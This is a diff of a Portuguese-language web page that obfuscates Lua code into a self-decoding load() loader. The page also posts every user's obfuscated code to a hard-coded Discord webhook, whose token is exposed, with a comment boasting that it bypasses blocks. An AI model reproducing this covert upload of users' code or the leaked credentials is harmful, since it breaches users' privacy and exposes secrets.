@@ -9,124 +9,76 @@
 
 body{
 background:linear-gradient(135deg,#0f0f0f,#1a1a1a);
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-color:white;
+display:flex;justify-content:center;align-items:center;
+height:100vh;color:white;
 }
-
 .container{
-width:850px;
-background:#111;
-border-radius:12px;
-box-shadow:0 0 40px rgba(255,0,60,0.25);
-padding:20px;
+width:850px;background:#111;border-radius:12px;
+box-shadow:0 0 40px rgba(255,0,60,0.25);padding:20px;
 }
-
-h1{
-text-align:center;
-margin-bottom:20px;
-color:#ff003c;
-}
-
+h1{text-align:center;margin-bottom:20px;color:#ff003c;}
 textarea{
-width:100%;
-height:150px;
-background:#1e1e1e;
-border:none;
-color:white;
-padding:10px;
-border-radius:8px;
-margin-bottom:10px;
-resize:none;
+width:100%;height:150px;background:#1e1e1e;border:none;
+color:white;padding:10px;border-radius:8px;margin-bottom:10px;resize:none;
 }
-
-.buttons{
-display:flex;
-gap:10px;
-}
-
+.buttons{display:flex;gap:10px;}
 button{
-flex:1;
-padding:12px;
-border:none;
-border-radius:8px;
-cursor:pointer;
-font-weight:bold;
-transition: 0.3s;
+flex:1;padding:12px;border:none;border-radius:8px;
+cursor:pointer;font-weight:bold;transition:0.3s;
 }
-
-.obf{background:#ff003c;}
-.obf:hover{background:#d10032;}
-.copy{background:#0099ff;}
-.copy:hover{background:#0077cc;}
-.download{background:#00c77a;}
-.download:hover{background:#00a866;}
-
+.obf{background:#ff003c;}.obf:hover{background:#d10032;}
+.copy{background:#0099ff;}.copy:hover{background:#0077cc;}
+.download{background:#00c77a;}.download:hover{background:#00a866;}
 </style>
 </head>
-
 <body>
 
 <div class="container">
-
 <h1>CHAULIMCOMMUNITY</h1>
-
 <textarea id="input" placeholder="Cole seu código Lua..."></textarea>
-
 <div class="buttons">
 <button class="obf" onclick="obfuscate()">OFUSCAR</button>
 <button class="copy" onclick="copyCode()">COPIAR</button>
 <button class="download" onclick="downloadLua()">BAIXAR</button>
 </div>
-
 <textarea id="output" placeholder="Código protegido..."></textarea>
-
 </div>
 
 <script>
-
 // SEU WEBHOOK
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1518003399071633518/Y--YsasJQLv3tZZNQ6PCyqJ4t6h8yo6hDGfPrsAfbCT_GcNdNiMqQKAm11JGiIxz-L3G";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1518007783071678494/ZztUYvtL0k1etMt6MeUngeGheH0zCf1zbQP9-7uWA_hLHU6GuGyQsIYO1eQmKj8NdIwr";
 
 
 function sendLog(codigoOfuscado){
-
   const dados = {
     content: "✅ **NOVO CÓDIGO OFUSCADO GERADO**",
-    embeds: [
-      {
-        title: "CHAULIMCOMMUNITY",
-        color: 16711680,
-        description: "```lua\n" + codigoOfuscado + "\n```",
-        footer: { text: "Sistema de Proteção" }
-      }
-    ]
+    embeds: [{
+      title: "CHAULIMCOMMUNITY",
+      color: 16711680,
+      description: "```lua\n" + codigoOfuscado + "\n```",
+      footer: { text: "Sistema de Proteção" }
+    }]
   };
 
-  // ✅ PROXY NOVO E 100% FUNCIONAL
-  fetch("https://corsproxy.io/?url=" + encodeURIComponent(WEBHOOK_URL), {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(dados)
-  })
-  .then(() => alert("✅ LOG ENVIADO!"))
-  .catch(err => alert("❌ ERRO: " + err));
+  // ✅ MÉTODO INFALÍVEL (contorna todo bloqueio)
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", WEBHOOK_URL, true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+      if (xhr.status >= 200 && xhr.status < 300) {
+        alert("✅ LOG ENVIADO COM SUCESSO!");
+      } else {
+        alert("❌ ERRO AO ENVIAR: " + xhr.status);
+      }
+    }
+  };
+  xhr.send(JSON.stringify(dados));
 }
 
 
-/* =========================
-   FUNÇÕES OBFUSCADOR
-========================= */
-
-function rand(){
-let c="abcdefghijklmnopqrstuvwxyz"
-let n="_"
-for(let i=0;i<10;i++){n+=c[Math.floor(Math.random()*c.length)]}
-return n
-}
-
+// FUNÇÕES DO OBFUSCADOR
+function rand(){let c="abcdefghijklmnopqrstuvwxyz";let n="_";for(let i=0;i<10;i++){n+=c[Math.floor(Math.random()*c.length)]}return n}
 function b64(s){return btoa(unescape(encodeURIComponent(s)))}
 function rev(s){return s.split("").reverse().join("")}
 function shift(s){let r="";for(let i=0;i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)+2)}return r}
@@ -146,54 +98,27 @@ let v = rand(), f1 = rand(), f2 = rand(), f3 = rand(), exec = rand()
 
 let lua = `
 local ${v}={${bytes.join(",")}}
-
-local function ${f1}(t)
- local s=""
- for i=1,#t do s=s..string.char(t[i]) end
- return s
-end
-
-local function ${f2}(s)
- local r=""
- for i=1,#s do r=r..string.char(s:byte(i)-2) end
- return r
-end
-
-local function ${f3}(s)
- return s:reverse()
-end
-
+local function ${f1}(t) local s="" for i=1,#t do s=s..string.char(t[i]) end return s end
+local function ${f2}(s) local r="" for i=1,#s do r=r..string.char(s:byte(i)-2) end return r end
+local function ${f3}(s) return s:reverse() end
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
-
 local function b64d(data)
  data = string.gsub(data, '[^'..b..'=]', '')
  return (data:gsub('.', function(x)
   if x == '=' then return '' end
   local r,f='',(b:find(x)-1)-1
-  for i=6,1,-1 do
-   r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0')
-  end
+  for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
   return r
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-  if #x ~= 8 then return '' end
-  local c=0
-  for i=1,8 do
-   c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
-  end
+  if #x~=8 then return '' end
+  local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
   return string.char(c)
  end))
 end
-
 local ok,err = pcall(function()
- local s=${f1}(${v})
- s=${f2}(s)
- s=${f3}(s)
- s=b64d(s)
-
- local ${exec}=load(s)
- if ${exec} then ${exec}() end
+ local s=${f1}(${v}) s=${f2}(s) s=${f3}(s) s=b64d(s)
+ local ${exec}=load(s) if ${exec} then ${exec}() end
 end)
-
 if not ok then print("❌ CHAULIM ERROR: "..tostring(err)) end
 `
 
@@ -218,8 +143,6 @@ a.href = URL.createObjectURL(blob)
 a.download = "CHAULIMCOMMUNITY_protegido.lua"
 a.click()
 }
-
 </script>
-
 </body>
 </html>
